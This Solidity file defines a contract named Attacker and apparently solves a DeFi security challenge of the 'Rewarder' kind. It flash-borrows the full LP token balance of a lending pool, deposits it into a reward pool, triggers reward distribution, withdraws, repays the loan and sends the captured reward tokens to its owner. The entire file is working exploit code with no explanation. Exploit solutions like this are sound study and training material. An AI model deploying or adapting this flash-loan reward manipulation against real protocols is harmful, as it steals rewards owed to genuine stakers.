// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external;
}

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

contract Attacker {
    address immutable owner;
    IERC20 private immutable lpToken;
    IERC20 private immutable RToken;
    IRewardPool private immutable rPool;
    IFlashLoanPool private immutable flashloanPool;

    constructor(
        address _lpTokenAddress,
        address _RTokenAddress,
        address _addrRewardPool,
        address _addrFlashContract
    ) {
        owner = msg.sender;
        lpToken = IERC20(_lpTokenAddress);
        RToken = IERC20(_RTokenAddress);
        rPool = IRewardPool(_addrRewardPool);
        flashloanPool = IFlashLoanPool(_addrFlashContract);
    }

    function attack() external {
        uint256 balance = lpToken.balanceOf(address(flashloanPool));
        flashloanPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 _amount) public {
        lpToken.approve(address(rPool), _amount);
        rPool.deposit(_amount);
        rPool.distributeRewards();
        rPool.withdraw(_amount);
        lpToken.transfer(address(flashloanPool), _amount);
        uint256 reward = RToken.balanceOf(address(this));
        RToken.transfer(address(owner), reward);
    }
}
